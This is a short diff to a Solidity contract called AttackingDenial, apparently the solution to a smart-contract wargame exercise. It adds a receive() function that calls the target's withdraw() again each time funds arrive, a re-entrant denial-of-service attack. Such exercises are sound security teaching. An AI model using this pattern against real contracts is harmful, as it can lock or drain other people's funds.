@@ -10,4 +10,7 @@ contract AttackingDenial {
     }
 
     //Code me!
+    receive() external payable {
+        Denial(contractAddress).withdraw();
+    }
 }
